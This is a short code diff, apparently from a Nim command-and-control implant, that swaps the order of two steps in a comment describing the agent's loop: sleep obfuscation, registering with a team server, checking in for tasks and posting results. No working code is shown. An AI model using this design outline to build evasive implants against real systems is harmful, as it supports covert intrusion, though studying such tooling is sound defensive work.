@@ -25,8 +25,8 @@ proc main() =
 
     #[
         Agent routine: 
-        1. Register to the team server if not already register
-        2. Sleep Obfuscation
+        1. Sleep Obfuscation
+        2. Register to the team server if not already register
         3. Retrieve tasks via checkin request to a GET endpoint
         4. Execute task and post result
         5. If additional tasks have been fetched, go to 3.
